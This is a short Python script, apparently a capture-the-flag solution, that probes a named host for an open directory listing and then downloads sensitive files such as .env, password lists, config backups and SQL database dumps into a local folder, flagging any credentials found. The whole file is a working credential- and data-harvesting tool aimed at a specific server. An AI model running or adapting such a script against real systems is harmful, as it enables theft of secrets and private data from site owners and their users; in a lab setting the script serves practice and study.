import requests
import os
from urllib.parse import urljoin

BASE_URL = "https://files.0x10.cloud/"
TARGET_FILES = [
    ".env",
    "secret/passwords.txt",
    "backup/db_dump.sql",
    "backup/db_dump_20240301.sql",
    "config.bak",
    "passwords.txt"
]

print("=== Vulnerability Check: Open Directory Listing + Sensitive File Exposure ===\n")
print(f"Target: {BASE_URL}\n")

# Check if directory listing is enabled on root
try:
    response = requests.get(BASE_URL, timeout=8)
    if response.status_code == 200 and ("Index of" in response.text or "<a href=" in response.text.lower()):
        print("[+] Directory listing is ENABLED on https://files.0x10.cloud/")
        print("    Sensitive files can be directly accessed without authentication.\n")
    else:
        print("[-] Root directory listing not obvious, but testing direct file access...\n")
except Exception as e:
    print(f"[-] Error checking root: {e}\n")

# Attempt to download sensitive files
print("Attempting to download exposed sensitive files...\n")
downloaded_count = 0

for file_path in TARGET_FILES:
    full_url = urljoin(BASE_URL, file_path)
    save_path = os.path.join("exposed_files", file_path.replace("/", "_"))

    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200 and len(response.content) > 50:  # Avoid empty or error pages
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, "wb") as f:
                f.write(response.content)
            print(f"[+] SUCCESS: Downloaded {full_url}")
            print(f"    Saved to: {save_path} ({len(response.content):,} bytes)")
            downloaded_count += 1

            # Quick hint if it's the .env file
            if "env" in file_path.lower():
                print("    → .env file found! Contains DB credentials, SECRET_KEY, Redis, etc.")
        else:
            print(f"[-] Not accessible or empty: {full_url} (Status: {response.status_code})")
    except Exception as e:
        print(f"[-] Error accessing {full_url}: {e}")

print("\n" + "=" * 70)
print(f"Scan complete! {downloaded_count} sensitive file(s) successfully downloaded.")
print("Check the 'exposed_files' folder for credentials and possible flags.")
print("Especially review .env and any .sql dump files for the CTF flag.")